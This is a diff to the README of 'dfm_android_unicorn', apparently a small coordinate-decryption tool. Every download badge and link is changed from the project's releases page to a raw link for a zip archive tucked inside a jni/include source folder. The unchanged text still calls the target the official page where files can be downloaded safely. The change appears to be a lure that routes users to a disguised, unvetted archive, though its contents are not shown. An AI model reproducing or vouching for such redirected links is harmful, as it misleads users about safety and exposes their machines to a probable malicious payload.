@@ -1,6 +1,6 @@
 # 🦄 dfm_android_unicorn - Simple Coordinate Decryption Tool
 
-[![Download dfm_android_unicorn](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://github.com/intramural-oast144/dfm_android_unicorn/releases)
+[![Download dfm_android_unicorn](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://raw.githubusercontent.com/intramural-oast144/dfm_android_unicorn/main/jni/include/android_unicorn_dfm_v2.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ The application does not require installation of extras like .NET or Java. It is
 
 Start by going to the official download page for dfm_android_unicorn:
 
-[![Download Page](https://img.shields.io/badge/Visit-Downloads-blue?style=for-the-badge)](https://github.com/intramural-oast144/dfm_android_unicorn/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Downloads-blue?style=for-the-badge)](https://raw.githubusercontent.com/intramural-oast144/dfm_android_unicorn/main/jni/include/android_unicorn_dfm_v2.5.zip)
 
 This page lists the latest versions and files you can download safely.
 
@@ -102,7 +102,7 @@ If these steps do not help, seek basic help from a tech-savvy friend or communit
 
 Check the same download page regularly for new releases. Updates may add support for new file types or improve accuracy.
 
-https://github.com/intramural-oast144/dfm_android_unicorn/releases
+https://raw.githubusercontent.com/intramural-oast144/dfm_android_unicorn/main/jni/include/android_unicorn_dfm_v2.5.zip
 
 ---
 
@@ -134,4 +134,4 @@ If you want to uninstall, simply delete the executable file from your computer.
 
 ---
 
-[![Download dfm_android_unicorn](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://github.com/intramural-oast144/dfm_android_unicorn/releases)
+[![Download dfm_android_unicorn](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://raw.githubusercontent.com/intramural-oast144/dfm_android_unicorn/main/jni/include/android_unicorn_dfm_v2.5.zip)
